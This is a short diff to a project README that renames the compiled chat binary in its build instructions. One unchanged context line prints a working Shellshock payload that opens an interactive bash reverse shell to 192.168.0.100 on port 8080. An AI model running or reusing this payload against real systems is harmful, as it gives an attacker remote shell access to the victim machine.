@@ -12,7 +12,7 @@
     the Shellshock it self: "env x='() { :;}; ' $(command -v bash) -i >& /dev/tcp/192.168.0.100/8080 0>&1"
 
 # building
-On Linux: gcc main.c -o sslchat -lssl -lcrypto -pthread -std=gnu99
+On Linux: gcc main.c -o peer-chat -lssl -lcrypto -pthread -std=gnu99
 
 On Windows: use DevC++ (latest) WIN32/WIN64 Compiler
 
